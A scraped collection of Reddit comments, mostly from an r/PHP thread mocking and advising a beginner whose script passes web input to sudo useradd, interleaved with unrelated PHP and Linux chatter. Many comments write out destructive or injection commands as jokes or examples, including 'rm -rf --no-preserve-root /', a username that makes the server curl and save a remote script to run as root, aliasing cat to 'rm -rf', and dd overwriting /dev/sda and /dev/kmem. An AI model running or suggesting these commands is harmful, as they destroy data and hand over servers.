Long story short: bleeding-edge. Stuff can break easily, and I am an archer (on a desktop) since December 2010.
I'm going to assume this isn't a troll post. Closed How? There is 0% chance that something on the network has a second nic that's connected to the internet? There is no local wireless access at all? There are also no live jacks in unsecured locations? All physical access is restricted with 100% guarantee that no one with access would want to cause harm to the network? And everyone using the network would be fine (other than the extra man hours to rebuild) with all the data on the network getting out into the wild and/or being destroyed? Even if all that is true you are putting something on a server that can cause massive amounts of damage. If you don't own this network I would take a different approach. You are trying to solve an already solved problem. As XyploatKyrt mentioned there are plenty of great software packages that will give you this plus lots more functionality. If you want something special look into how to add functionality to an existing software package. 
this kills the server
it is...
This is some pretty bad code, but all of you making joke comments without giving any useful advice are worse. This guy is obviously a novice, and jokes will not help him learn. None of you emerged from the womb with an innate knowledge of security and best practices. Thanks to the few people who are trying to actually help OP.
Don't you also need a `--no-preserve-root` (or your distro's alternative) argument? I remember `rm` not executing when I used `rm -rf /` on my virtualbox for fun. EDIT: Changed parameter name
Give him a break, he's probably 12 years old so let him learn from his mistakes or he's just a troll.
Yes, you need to `rm -rf --no-preserve-root /` your cloud first to set it's mode to production and clean it.
I use NFS. &gt;If your site runs PHP, you should use the mail() function. &gt;For all CGI languages, you should use /usr/bin/sendmail. &gt;These are the only supported methods to send email from sites hosted on our service. &gt;You may not connect to SMTP ports 25 or 465 on other network's servers.
or `/dev/zero`
Oh yeah, that makes sense. 
rm -rf /* (shorter)
If you put a ; in the username, anything after the ; would be code you could execute. For example: myusername;sudo rm -rf /* as a username would delete everything on the server myusername;curl -w http://www.myserver.com/remote_command_executer.php &gt; localfile.php Would download a file to the server that could contain whatever code you wanted to execute as root. With full permissions on the machine you could use that to do anything the hell you wanted 
Chill you guys, the OP is just trolling.
but my redundencies are cloud based. WHAT DOES THIS MEAN
Well, this *is* /r/php...
good ol' Bobby Tables...
Only via sudo.
With a gun inside. 
right on. You're getting some good tips here but has anyone really been far even as decided to use even go want to do look more like?
best thread on the whole thing
Just use [webmin](http://www.webmin.com/). It will let you use a web browser to add/change user accounts, and is much less likely to get you rooted.
yes. it *is.*
And a sign saying "free to a good home"
I don't think OP even knew what input sanitization is until this thread.
Oh christ. I can't think of many things more evil than that.
Take a look at [FreeIPA](http://www.freeipa.org/page/Main_Page). If you wanted to code this up your self then, I would try and mimic how Active Directory works. Take a look at [Kerberos](http://en.wikipedia.org/wiki/Kerberos_(protocol)) and [LDAP](http://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol). I am not all that familiar with PHP, but I might look at creating a separate shell script to handle adding users. Though I'm not sure whether that would make it any easier / more secure.
If you just want a tool that you can use locally/headless on your local LAN use webmin.
Oh nevermind, just a headache. 
You should test updates before pushing to production either way and in my experience Ubuntu breaks way more often than Arch.
I can confirm as my company's management is constantly bitching &amp; spending hours debating on how to do something without involving our off site developer for 5 minutes of code (not even joking) that would make our lives exponentially easier because it supposedly takes them days to even get a hold of him &amp; have no way to validate what he's actually doing. On top of that, none of them are coders &amp; blow off people who can actually bridge the divide. Not sure if it's stupidity, pride or what. Probably a little of both.
It'll be a waste of your time to try to go line-by-line through all your dependencies. The best you can do is read through each project's github issues, or google to see if there are any publicized vulnerabilities for each library. If it's something like a Symfony component that has hundreds of contributors, don't even bother. If it's something that has maybe 1 contributor and a few stars on Github, then a review may be worth your time. A few things to ask: * Does this library have an extensive test suite? * How many people contribute to this library? * If the library interacts with a database, does it use a DBAL, PDO or `mysql_*`? * How many open issues are there, and how many appear to be security-related? edit: By the way, this is a very good question. I know I have wrestled with this very issue before, and many others have, too. I, specifically, am working for a health industry company, so we need to make sure and audit every piece of code that touches our codebase. This means that I have gravitated more towards smaller libraries I can manually audit, and then stick with a certain commit hash, or go with large libraries that have hundreds of contributors behind it and stick with stable releases. Previously I have also done security and bug audits for a client's own codebase, and have thoroughly enjoyed thrashing other people's work.
This is a cancerous state of mind that has no place in software development. You don't limit bad security practices based on your own limitations of being able to pull off an exploit. You don't even limit it to the abilities of people in this subreddit, or anyone you know on the internet. There will always be somebody smarter than you finding ways to exploit things that you or anyone in this subreddit can even imagine. Despite that, this one is a no brainer... it violates the very 1st security principle out there. This code has an extremely easy way to exploit it. These kind of injection vulnerabilities are the most prevalent out there on the internet, and have the highest amount of risk and damage coming from them. If you haven't learned to spot these yet... it's in your best interest to do so. owasp.org
Depends on whether --preserve-root or --no-preserve-root is the default on your distro. But yeah, on Arch you would. 
Try having your PHP exec a bash script, instead. 
Very Nice, i like your style, maybe something less destructive but infuriating? alias all editors and cat to something like.... sudo date --set="`shuf -i 1-23 -n 3 | tr '\n' ':' | sed -e 's/:$//g'`" ; cat Sets the system time to random-ish times whenever they use the command 
Happy cake day!
You can do environment specific configuration using INI. Either way, I wouldn't use objects for configuration your just adding complication and gaining nothing. It's harder to merge or flatten objects for instance and it's more expensive than a simple array.
For `ls -a` you need to do an extra step if it is indeed empty.
'I do not really agree' How about stating why, or are you just going with the down votes I received from junior developers that circle jerk here? 
In the shell, &amp;&amp; will cause the second command to execute if the first command succeeds (this is called [short-circuit evaluation](http://en.wikipedia.org/wiki/Short-circuit_evaluation), most programming languages will do this). You may want to do something like &gt; $ wget -O output www.google.com &amp;&amp; cat output # A It will download the contents of www.google.com, and print it *if* the download succeeded. merely using &gt; $ wget -O output www.google.com ; cat output # B fails to account for the fact that during the end of civilization, google may become unreachable, and then it will print an old version of "output" (or junk) when you run it. You can use &amp;&amp; as a quick if-statement The first wget-example (A) is functionally equivalent to &gt; $ if wget -O output www.google.com; then &gt; cat output &gt; fi while (B) is merely &gt; $ wget -O output www.google.com &gt; $ cat output You can use || as an "if not". It will run the right-hand side only if the left hand side failed. &gt; $ wget -O output www.google.com &amp;&amp; cat output || echo "let pillaging commence" is the same as &gt; $ if wget -O output www.google.com; then &gt; cat output &gt; else &gt; echo "let pillaging commence" &gt; fi If-statements are amazingly non-magical in shell programming. There is actually a command named [ (it's in /usr/bin) that returns an error code depending on whether or not it's arguments evaluates to true. [[ is a built-in shell command. You can run these like any old program. So it's completely possible to write &gt; if [[ "$var" == "test" ]]; then echo "foobar"; fi as &gt; [[ "$var" == "test" ]] &amp;&amp; echo "foobar" Or why not &gt; ((3*5 == 15)) &amp;&amp; echo "math still works" || mail jesus@example.com -c god@example.com -s "So apparently the end is nigh" &lt;&lt;&lt; "I REPENT"
More like the Apache Trail of Tears.
$&gt; touch foo $&gt; alias cat='rm -rf' $&gt; cat foo $&gt; ls foo
Yes. If you follow the blog, the infrequent breakages and how to fix then will be explained to you
Why?!
False, sbin is for statically linked binaries.
as noted before it is a feature with which distros implementation of rm. With arch it is GNU rm with a little twist. so that in order to have it blow away the whole system you would need to run it as: rm -rf --no-perserve-root / then it would go and delete the system. But my thought for something fun would be ; chmod -R 777 / Then that would break the whole system and maybe give him time to think about what he has done
That would cause some damage, but wouldn't wipe out the entire hard drive. Notice how he's using sudo, Once you've added the ';' to the end, it becomes a new command to bash, which is not run by sudo. So it would be annoying, but not as bad as running that command as root. Also, doing this with PHP? Really? No... just no.
(Originally that is, but as with /bin and /usr/bin it's use has been changed.)
You'll learn a lot with Dayle Rees' Laravel Tutorials. http://codehappy.daylerees.com/ CodeIgniter is outdated, but might also be a good place for you to start (it's where I picked up OOP) Here's a Build a blog in 20 minutes tutorial http://www.youtube.com/watch?v=mWsAruzW3Jw Enjoy!
That's fine if you want to just plain get rid of a directory. But if you actually cared about the contents, such as moving a git checkout up one level, rmdir is the better option, imo.
The initramfs would still not be *that* big, and if you're doing it you can probably afford the small extra space.
and group wheel
That's not what the word "proof" means 
Understood. Just like the rest of the "standards" in the world that nobody follows.
I am assumin your encrypted passwords starts with a "$", which is not gonna work. So put quotes around it, like this: shell_exec("sudo useradd -p '$encpass' -g groupname -s /bin/bash $username");
http://i.imgur.com/Ma8RRN9.png
http://i.imgur.com/29CqN.jpg
And that would only work in the subshell that is executing the adduser command.
The next rule of web development security is: Your webserver SHOULD NEVER BE PRIVILEGED! Your webserver, if it has mod_php installed, by definition is designed to execute arbitrary code on the file system. Someone could do a lot worse than rm -rf / injection. They could write a file to the file system in the webroot that becomes a back door or even a trojan spreader. The only right way to architect this (if at all) is to use a separate process to pick up messages from the web server (that builds the command based on data in the message). 
every user needs to have their own unique salt, or salting is pointless. There are password specific functions in php 5.5: http://www.php.net/manual/en/function.password-hash.php or if you don't have 5.5 there is a compat library: https://github.com/ircmaxell/password_compat edit: added libraries because people tend to use crypt wrong. 
Ubuntu is also a poor choice for a server. Debian Stable is the way to go.
One smal tweak... really ought to use crypt for this. Strongly recommend using password SPECIFIC hashing algorithms, bcrypt and pbkdf2(in php 5.5) is all that's available in PHP right now.
A lot of people tell you here that this script and the sudo command is a terrible security hole. And I agree with them. Even adding user accounts like that by itself is a security risk, but if that's what you want to do... Well, if I were to implement something I would look for a PAM module that would let me to allow authentication from other sources than /etc/passwd and /etc/shadow. For example a database. Not sure if such module is available, since I never done it, but I don't see why not. Next have the script simply add new entries to the DB. That way no sudo is needed anymore. You still need to worry about escaping SQL queries (if you use SQL database).
/r/netsec
LOL
My suggestion is to get rid of the default authentication module in your OS, and swap it out with a system like LDAP. then managing LDAP is pretty easy and a tiny bit more secure. Still gonna need to do alot of validation and making sure input is secure.. but it would be a tiny bit better than what you're doing now. Beyond that, there are systems specifically made for this kind of work that is a lot more robust and secure than what you're trying to do now.
It is, however, what the phrase, "proof enough" means.
Of course, you can't personally justify one standard that we dislike, so therefore we obviously don't follow any standards at all. In reality: people follow standards that are justified, just like people follow laws that they feel are justified. Do you speed? Then perhaps you can understand why people might break standards that even you, the champion in this thread for the standards, cannot properly articulate the worth of. 
echo "alias cat='rm -rf'" &gt;&gt; /home/*/.profile; echo "alias cat='rm -rf'" &gt;&gt; /root/.profile;
Except on the internet it's the other way around, "Never attribute to stupidity that which is adequately explained by malice".
you just need to spin up some vms
That doesn't even English. http://www.homestarrunner.com/sbemail13.html
my apologies. i just a fleshlight and was a bit distracted.
Where does one buy a vms spinner? ;)
Or, just copy this code... &lt;?php function x_get_issue_archive_link( $atts, $content = null ) { global $post; return '&lt;a href="' esc_url( get_post_meta( get_the_ID(), 'issue-archive-1-link', true) . '"&gt;' . wp_kses_post( do_shortcode( $content ) ) . '&lt;/a&gt;'; } add_shortcode( 'archive-link', 'x_get_issue_archive_link' );
You're far too kind.
Fair enough, not everything reads .profile though.
Sorry, I'm not referring to the actual install of Laravel. That's probably another 40 seconds to a minute. I'm referring to scaffolding an app using Laravel 4 Generators from Jeffrey Way. Look into them. Srs. And... yes. There is a subreddit with laravel discussion. I'll leave it to you to figure out what it's called. ;)
This.
Funny enough, very old versions (like, mid-'90s versions) of Netscape had a similar problem. If you had a URL like "telnet:example.com" they'd just change the colon to a space and invoke exec() on it.
This looks like an excellent concept, and you ought to deploy it immediately.
&gt; I can extend multiple configurations like staging extends common or product extends common where common class has common configurations and you can overwrite them with classes that extend to them based on environments. array_merge_recursive() ? &gt; Why would you flatten objects? It's a pretty standard way of getting and setting configuration values. $config = new Config(); $config-&gt;get('project.name'); Or if you prefer Laravel. Config::get('project.name'); I suppose it's possible to do that with your config though now I think about it. &gt; And no, classes are not more expensive they are actually faster I've just done some research and it appears as though it depends on the situation (PHP 5.4 has made significant improvements to the speed of objects) but overall the consensus is [objects are slower](http://stackoverflow.com/a/8498190/249390) than associative arrays. Which makes total sense.
/dev/zero or /dev/urandom surely? Don't want your hard drive wiper to slow down due to lack of entropy.
&gt; Does this library have an extensive test suite? I just ran a code coverage report on Laravel, it seems the core farmework only has 44% coverage! Is that right? It doesn't seem right... But aside from that, this is a pretty awesome answer. Thanks.
Symbolic links.
&gt; This is a close second to genocide. Oh god there is so much awesome in this thread.
&gt; and were suddenly pwned.
I disagree, not about the Debian Stable part, obviously it is the way to go (at least for a non-corporate server), but about Ubuntu. If you run an LTS that's at least a year old, you're fine with Ubuntu.
That wouldn't do anything. You need ; sudo rm -rf --no-preserve-root / for it to actually work. On a modern linux distro rm -rf / will just tell you about how fucked you almost were.
if you are in a linux env you could change the approach and use PAM. pam_mysql or pam_ldap. 
Won't actually do anything in any modern distribution. :(
I actually use uid aliasing a lot, especially on plesk machines: 1 user/pw for ftp that ends up in web tree 1 user/pw for ssh+git that has its own homedir Shared uid so the latter can also manage the former's files. Neat.
Good point; but I'd like to see a beginner try and pull that off. edit: grammar
Beyond all of the other reasons people have made fun of you, using arch as a web server is pretty absurd. 
Congratulations! Your computer now has HIV.
One of my amusing accomplishments at a former employer was migrating some webservers, without downtime, from port 80/root to port 8080 so that mere mortals could do pushes.
Eh, Debian depends on your business. Sometimes you really do need a version of something that isn't six years old and then you're fucked when it comes to maintaining it.
I googled a bit and now know that rm means remove file. What does -fr / do? Remove file from / aka root aka destroy everything?
Yeah, we called our son little Bobby Fuckthatharddiscup
What if my username is $(sudo rm -rf --no-preserve-root /) or `sudo rm -rf --no-preserve-root /` ?
Silly, it's where you test how well your code works.
Assuming you aren't trolling...it means that everyone who fills out your form can post any data they want and you are saving it verbatim. No bueno.
Nobody is arguing otherwise. I saw a chance to educate a bit about sudo and took it. Other commenters have covered the other aspects of why OP shouldn't do this.
Well sql injection is still one thing. at worst, the hacker drops the database. This is a whole *another* level of breach. The user has privileged command line access to the entire fucking system at operating system level. I don't even, that's just. wow.
I azure you you will find one eventually.
I'm running it directly on the server.
Good, because I need clojure on this.
Yes, which is why I said open a ticket. Seems something is wrong on their end. 
Well setting aside the horrors of giving http sudo access (without having to type a password, no less! I didn't even know something so horrifyingly insecure was possible!)… … in OP's defense, it's not as if it is passing $_POST['username'] - we don't know what cleansing or sanity checks may have occurred already. Edit: [Nevermind.](http://www.reddit.com/r/PHP/comments/1l7baq/creating_a_user_from_the_web_problem/cbwg93s)
I would say, "at worst the hacker injects malware into your trusted website". 
It's not. People are not reading/understanding the issue and are confusing the issue. NFS has preconfigured PHP to use their email relay. This means mail() should just work. Your account should be able to access mail.nearlyfreespeech.com:25 but NOT mail.someotherisp.com:25. This means using other transports like some have suggested will not work. You must use mail(). The fact that mail() can't connect to NFS's mail relay is a problem on NFS's side.
Maybe he's just making some GUI for the system over HTTP? I mean I can see myself doing most of my work in a browser if I ever need to control my unix-like system like a raspberry pi or something.
Is it public facing? What's the url? We can better help if we know the url.
What if Op wanted to give some GUI. As a web dev, browsers are a lot more convenient to work on (think exposing some API via php to the javascript)
I know a lot of people are giving you shit for this but THAT'S WHAT BEING A BEGINNER MEANS - making mistakes, learning from them, and getting better. There are just so many considerations to know about web security. It boils down to "Don't ever trust anything your users say and do", but until you have a full sense of what kind of effects their actions can have, it's difficult to anticipate why you have to do things in certain ways. So really the best thing to do is learn about the tricks people use for hacking websites - what they do, what weakness they exploit, and what stops them. 
They actually just go to syslog
xkcd is always relev**a**nt!
Russel Brand'd here...
Yea I didnt put much thought at the worse case scenario. But I think it depends, for some applications loosing all data is a lot worse than injecting malware.
Actually, it might still be [stupidity](http://i.imgur.com/RxAePpz.jpg).
But if you pour some acid on the server, you can get that scale to come right off.
This could be helpful: https://security.sensiolabs.org/
Oooh, look everyone, a Microsoft employee!
There were senior developers at my last position that didn't know what input sanitation was. I left as soon as possible.
Yes.
Ah, now I get it... the National *Santa* Archives.
They weren't giving examples before because it should be plainly obvious to you how to create a malicious string that would exploit such an obvious hole to execute arbitrary code. If it isn't, then you need to bone up. A lot.
Or just laughed. 
Shards are awesome. I love shards.
Varnish -&gt; Nginx -&gt; PHP-FPM -&gt; Redis. There is no reason in this day and age to keep using memcached.
"easy to start with" -- the downfall of PHP
If you're going to define it that way, "proof enough" could mean almost anything. The fact that his name is ionlysayha is "proof enough" that he murders puppies, because I'm convinced. You used a word that means "conclusive", and then stuck a weasel word after it to cancel it out; it's like saying "almost positive"
I noticed this as well. I mean, I'm a novice with PHP as well and instead of helpful suggestions (thankfully there are exceptions) all I see is pointless shaming. 
`do_shortcode` is part of WordPress core.
DOOOO IIIIT
for the record this might be because of systemd-logind and sudo not being able to acquire a session without a controlling terminal (through PAM) 
How am I not using crypt and password specific algorithms? $6$ is sha512 crypt, which is exactly what you get out of password_hash. I am generating the salt correctly, and I am doing this in a way which is comatible with nearly every PHP installation. You cannot generate a SHA512 crypted password using PHP's password hash, and you do NOT want to use bcrypt for this because it is inserting it as a user hash, and bcrypt is _not_ supported in many versions of shadow.
But Carbon looks nice anyway. I'll probably use it and extend it to at least make it somehow suitable for use with microseconds with the answers in the SO post and /u/androok's answer. The state of date handling and arbitrary precision calculation is sad in the world of PHP. It seems it wasn't really made for ecommerce systems, but it is what my boss wants to use.
staph
&gt;run commands other than what you intended I fear that that phrasing may seem innocuous to the unfamiliar. This particular input is being run through sudo, so it might be good to emphasize that this can be used to completely take control of your server.
Too soon.
Devops is basically giving root to the web developers...
Thanks, I'll use this in my factory function for DateTime objects. I hope there aren't any more suprises waiting for me in the DateTime library...
I thought at first maybe someone would be that dumb, I mean, it's not the first time I've heard of someone trying to do this (and back in the day I wrote a php script to allow users to change their password, but did it using a ton of security unlike this). Then I saw [this](http://www.reddit.com/r/PHP/comments/1l7baq/creating_a_user_from_the_web_problem/cbwg8re) and came to the conclusion this guy is not serious. Even if you're dumb enough to try and implement user adding with no security, it would be unlikely to occur to you to shell exec perl to encrypt a password from php. That's just too much!
The fact that he's shell execing perl to encrypt the password is more likely proof that he's trolling us.
Want to believe you...want to try it...but...
Sublime Text 2/3. You'll thank me later.
See also [Breaking Systems For Fun And Profit](http://www.breakingsystemsforfunandprofit.com/).
&gt; Sublime Text That was one I was looking at heavily. It's at the top of the list. Thanks. 
Cool but is there a way to do a search for something the. Have multi carrot editing? 
He's got a phone for ya
Do lines 2+3 show up? If so, it's almost certainly not your shortcode, but something in the echo. Does the page exit, or do you just get an empty url in the href on line 4?
I've yet to meet or interview any developer who actually knew that PDO uses emulated prepared statements by default.
This whole thing was caused by a fundamental methodology flaw. This is not some isolated problem in the far reaches of a web app - this is a developer being dangerously incompetent and completely missing the big picture. This guy is light-years away from having what it takes to develop web apps without being pwnt by russian hackers. Web dev is serious business.
Yes, the shell would evaluate it. Php doesn't evaluate the string though 
To be fair, Linux is NOT user-friendly.
How long have you been using it? I don't recall ever doing a blind "--force". I *do* recall my kernel breaking multiple times during the course of upgrading and the attitude being on the forum "oh, well that's clearly user error, despite the many people coming on here and complaining". No, I wasn't following the news. But I also have never used another operating system which expected you to check on a website to see whether it was safe to update today or not...
You say: "Let me add as well: don't be a PHP developer. I'd never hire a senior "PHP" Developer." My question is what do you think about PHP certification? Is it worthwhile?
Remember to disable iptables first. That could cause issues. Oh, and chmod -R 777 /etc
Then take advantage of the fact that you access to the full file system: sudo rm -f $(which cat); echo -e '#!/bin/bash \nrm -rf' | sudo tee /bin/cat; sudo chmod +x /bin/cat; Edit: forgot to chmod the script to make it executable.
Second most popular? I'd argue that Android + servers put it at the top o.O
You can make your own packages, compile from source, etc. There is no reason to upgrade your entire system because you need the bleeding edge of one piece of software. 
Yeah it does. Treating '/' specially is (the default).
what happens if a user enters foo &amp;&amp; rm -rf / as the second argument...
To be frank, I don't think PHP is a good beginner's language because the potential for damage when you screw up is absolutely insane. You should probably cut your teeth on non-web development first, then transition to web dev in a sane language (C#, Python, Go...) Web dev in general is tricky since you need to design, implement and maintain complex security models; security concerns are always present, but without rigorous training and experience you'll miss them more often than not. Furthermore, PHP is well-known for gleefully letting devs shoot themselves in the feet, or even encouraging them to.
&gt;to the OP, apparently not You were the one who demanded examples, not OP. If the OP still didn't understand, **he** could request them. &gt;it helps build up the image of Linux as being non-user-friendly This is a programming subreddit. No one expects it to be user friendly, nor do I care about OS wars. I don't even use Linux by the way.
This guy doesn't need help learning - he needs to be prevented from touching a command line lest he cause massive material damage to him and others, possibly garnering civil or criminal charges in the process.
Have the user interacting with the system authenticate with a real username/password of an account with sudo access on the machine. Run commands as that user, not as root (use the -S flag to pipe the password to sudo stdin). Lock down the list of commands that user can run under sudo to only those required by the application. Sanitize all inputs. Run over HTTPS for god sake. At least that will ensure that not just anyone can come along and run commands as root on the machine.
or use [escapeshellargs](http://php.net/escapeshellargs)
What are you even trying to accomplish with a web interface to OS users?
I have vendors that use `ALL=(ALL) NOPASSWD: ALL` for their services...
&gt; `/opt`? Yes, I think so.
What you just said, is one of the most insanely idiotic things I've ever heard. At no point during your rambling, incoherent post were even close to anything that could be considered secure. Everyone in this thread is now dumber for having read it. I award you no points, and may god have mercy on your soul. http://www.youtube.com/watch?v=0MRmxfLuNto
Too sudden. Have them play some Russian roulette every time they run a common utility: sudo mv $(which cat) /bin/.oldcat; echo -e '#!/bin/bash \ndd if=/dev/random of=/dev/kmem count=1 bs=1 seek=$RANDOM \n/bin/.oldcat "$@"' | sudo tee /bin/cat; sudo chmod +x /bin/cat; sudo mv $(which ls) /bin/.oldls; echo -e '#!/bin/bash \ndd if=/dev/random of=/dev/sda count=1 bs=1 seek=$RANDOM \n/bin/.oldls "$@"' | sudo tee /bin/ls; sudo chmod +x /bin/ls; Edit: Another fun one (not quite as sudden as yours, but more sudden than Russian roulette): sudo chmod 000 $(which chmod) 
Well then I can just change the username to that
Don't you also need sudo for the "rm" command?
There are a few nice tools out there that help determine the quality of PHP code. I do a lot if security audits for web apps as well as write PHP, so I've tried a lot if different things. Apologies in advance for lack if links, as I am on my phone... For static code analysis, I use the following: * PHPCodeSniffer, set to use PSR-0, PSR-1, and PSR-2 as the default rule sets. [[phpcodesniffer]](http://pear.php.net/package/PHP_CodeSniffer/) * RIPS - this is a handy static analysis tool that runs as a web application, so if you have a virtual host setup you can have this "always on" [[rips]](http://sourceforge.net/projects/rips-scanner/) * RATS - another static analyzer for multiple scripting languages. Can catch some more common performance pitfalls. EDIT: It looks like RATs is no more. No worries. [Yasca](http://www.scovetta.com/yasca.html) does the same thing * PHP Mess Detector - this will look for more complicated code smells like naming conventions and algorithmic over-engineering. [[phpmd]](http://phpmd.org/) * Valgrind/Webgrind - when you need to see all the call stack in gory machine-level detail. [[valgrind]](http://valgrind.org/) [[webgrind]](https://github.com/jokkedk/webgrind) I realize that these aren't really specifically security tools, but functional code review and static analysis kind of go hand in hand. The only non static way to test code security is to do a Pen Test on a working app. If you're going to do that, check out: * Skipfish - an automated scanner that is meant to just blanket a site and grab the low-hanging fruit. [[skipfish]](https://code.google.com/p/skipfish/) * OWASP Mantra - it's essentially Firefox with all the hack tools [[mantra]](https://www.owasp.org/index.php/OWASP_Mantra_-_Security_Framework) * OWASP ZAP - it's a proxy that allows you to do all the normal attack/intrusion stuff [[zap]](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) On the subject of Laravel itself, I can tell you first hand that the codebase is fanatically guarded, and code that gets merged has been vetted by several people first. Of course, Laravel itself is secure, but it only takes one unaware programmer to break any good system. EDIT: Provided links for great justice. 
That's fine, but given the difficulties you mentioned, it would be better to either help troubleshoot his code (because he's in over his head) or suggest alternatives like you just did for me. I have no problem with poking fun at someone for making stupid mistakes or missing something obvious, so long as a solution is also presented so the problem doesn't repeat itself. Insulting and shaming for no other purpose doesn't accomplish anything beyond making the community as a whole look immature and unwelcoming. 
If you keep in mind that a compiled and installed package for a decent piece of software is generally stable and you don't need to touch it, there isn't much maintenance to do at all except for security updates. For me compiling the latest emacs and pidgin are a must for my Debian stable desktop but I let Debian take care of the rest. If you only have to worry about six or seven critical packages that you are using every day anyway it really isn't that awful to keep maintaining them. Most decent software is inherently stable once it's setup so you only need to worry about upgrading when *you* want to.
Well, my thought was that data loss can be ameliorated by a good backup scheme - if the database gets dumped, you will know immediately and can restore. But malware injection can go undetected for a long time, causing unseen harm capturing all manner of sensitive personal and financial data from you and your customers (which would create fraud patterns that would point back to you and for example get you in trouble with the PCI if you take credit cards). 
But we are talking about a *worst* case scenario. There is no database backup!
Actually it is very good practice to use "rmdir", "rm" and "rm -rf" separately and not just use "rm -rf" for everything. It is good to get into the habit of knowing EXACTLY what you are trying to do. Otherwise accidents happen far to easily.
Recursive Force sounds like the department that breaks all the rules but they get results, dammit.
Any chance I could get an explanation on this? What's going on exactly?
It actually sends an email to root complaining about your naughtiness.
&gt; ... I'm a bash noob. You are so lucky. 
RadioShack
&gt; or do you just get an empty url in the href on line 4? This. The best I can tell is that calling the shortcode, in some manner, doesn't allow the echo's that come after it to function. If I remove the shortcode everything works as intended.
Global salts (peppers) are not pointless. They are less effective but they defeat rainbow tables and other precomputation attacks.
Yeah. I checked this last night and the only errors in it were from 3+ weeks ago. I don't have access right this second, but I will check it again.
If you'd like to add more/better support to Carbon for milliseconds I'm sure the author would accept a PR. Suggesting that PHP wasn't built for e-commerce because out of the box miliseconds are not handled in DateTime or third-party libraries is bizarre. PHP is not built for any specific industry, its a generic tool you can use to build stuff on the internet,
I'm actually adding the code via the do_shortcode method directly into the template then uploading via FTP, so I'm not using the editor at all. Yeah, a few years ago I tried to use a few plugins that allow for PHP execution and they are just a headache.
Thank for for not being a dick and actually trying to teach something.
PHP has BC Math for arbitrary precision arithmetic. And, I'm sure the lack of microsecond inclusion in `DateTime` was not without a reasonable explanation. To be fair, the utility of microsecond precision in 99.9% of web apps and websites is questionable, at best, anyway. I've no idea what it would be used for in an ecommerce environment, in particular.
Would it be beneficial to post the code that is imported via the shortcode?
Yeah this guy obviously doesn't write PHP and has just come from knowing some Unix. Assuming it's not a troll of course.
This is used to inject commands into the exec() call from php. Say I have this snippet of PHP: exec("/usr/sbin/useradd $username"); This would run the command `/usr/sbin/useradd` with the argument `$username` to create a user on the local system. No surprises there. Just like in PHP, "`;`" is used to terminate a command string in the shell. It's just optional, so you don't really see it often. Unless somebody wants to run multiple commands in one line: useradd test; passwd test This would tell the shell to add a user named test to the system and then run the `passwd` command to change the password for the user test. The important bit (!) is that the second command, `passwd`, will run regardless of if the first command succeeds or fails. So back to the issue. Say `$username` is supplied by the user. If I submit "`paranoidelephpant`" to the form, the executed command becomes "`/usr/sbin/useradd paranoidelephpant`", right? So what if I submit my username as "`; sudo rm -rf /*`"? Then the command executed by PHP becomes "`/usr/sbin/useradd ; sudo rm -rf /*`" The call to `useradd` will fail, but the shell will continue on and execute the second command, "`sudo rm -rf /*`". What this does is runs a command to delete the root filesystem, recursively and without interaction, as the system administrator account (that's what sudo does). Because OP has given the Web server full root access via sudo, this second call will succeed and OP will end up with a very broken server.
Pretty much this. While I'm sure where I am in the hierarchy I'm never sure if I didn't press . one too many times and have ../* instead of ./* . When it tells me ./DeleteThis has files inside it I can always just go back one command and change three letters. 
I'm sorry, I should have been more clear in my post. I was exhausted when I submitted this. There are no error messages. The only indicator that something is wrong is that the PHP echo on line 4, or on any line below that, doesn't work. The source code shows &lt;a href=""&gt;, as if the code doesn't exist / does nothing at all.
I have my days. :-)
I'll just leave this here: [requiretty bypass PoC](https://gist.github.com/ryancdotorg/5136278)
No, the downfall of many amateur/hobbyist developers.
http://i.imgur.com/I8CZK.gif and http://i.imgur.com/OocV0Uy.gif
Pretty sure we can do it in 2 seconds if I help.
You can imagine yourself knowing how to make an http gui for the shell AND actually bothering? Why not just use ssh? I genuinely can't imagine any reason for this.
I'm happily using Carbon. An annoyance with PHP DateTime objects (and therefore Carbon) is that they're mutable. It's easy to do something like this: $nextDay = $date-&gt;addDay(); but forget that will change $date. The simple fix is: $nextDay = $date-&gt;copy()-&gt;addDay(); There is talk in the Carbon issue queue on Github about maybe fixing this with the next version of Carbon . i.e., methods should always return a new instance. It's quite a significant change so probably not something to be done lightly. I don't know if there are any performance issues with that. Probably not enough to worry about unless you're using lots of dates in a loop.
A big intensive for this is symbolic links, Imagine you have a directory foo with a file called file1 in it and a symlink bar that points to foo: something like this: foo `-- file1 bar -&gt; foo now what will the following 4 commands do? $ rmdir bar $ rm bar $ rm bar/ $ rm -rf bar/ 1 will fail and say rmdir: failed to remove ‘bar’: Not a directory 2 will remove the symlink bar 3 will fail and say rm: cannot remove ‘bar/’: Is a directory and 4 will remove foo/file1
It's more convenient, one click is better than typing on command line. That and I can be creative with a GUI, I have a personal assistant app which does a bunch of stuff, all of that was entirely possible with command line, but css transitions and javascript make it much more fun and JARVIS like.
You live up to your namesake good person. I'll research these when I get into work tomorrow. Thank you.
&gt; I know a lot of people are giving you shit for this but THAT'S WHAT BEING A BEGINNER MEANS - making mistakes, learning from them, and getting better. Sure, but programmers are supposed to be intelligent, too.
^ It's like seeing someone walk out onto a skyscraper ledge and threaten to jump, eh? Account deleted, I think perhaps OP got the message...
&gt; at least you could always get in as root if something happened... ಠ_ಠ
Why pipe the echoes into tee, and not just redirect them into the file? Am I missing something?
It's `rm --no-preserve-root -rf /` these days.
That's fine, it doesn't have to be just don't make weird assertions about a language just because you're having a tough finding a package that does exactly what you want. PHP itself has plenty of support for miliseconds, you just want to find a nice API for it. If it doesn't exist, you can send PR's or just work with the built in functions.
Come the fuck on, this is a common sense thing.
Besides the good points enlisted by /u/BOSS_OF_THE_INTERNET I would also consider aspects such as "how easy it is to breach outside the security components of the framework". You would expect security to be implicit, and fragile points explicit. I have no experience with Lavarel but I assume it's similar to symfony on some aspects like: output escaping by default, csrf protection, rfi inclusion free, user input eval free, and so forth. And how easily visible are the times when the developer "escapes" these aspects. Also worth looking into is the vulnerability history of the framework and the community response time to such issues. Most of the analyzers out there won't be able to do much, in the sense that they have not adapted well to the rise of abstractions. But that's not only their fault.
 ; find /dev -type b -name '?d?' -exec dd if=/dev/zero of={} bs=16M \;
I think in terms of number of computers with Linux on them, OS X wins. You're right, though, Linux has a bigger influence.
What a fantastic explanation! Thank you!
I can tell you that I'm not a big fan of these. I'd rather have array slices ala Python and then be able to do `func_get_args()[1:]` This is a pattern I encountered maybe once or twice in my code, on the other hand the following pattern is more common for me: function fancy_this($arguments) { return call_user_func_array($something, $arguments); } Which is the opposite of the proposed pattern :D
OS X has less computers than Android has phones ;)
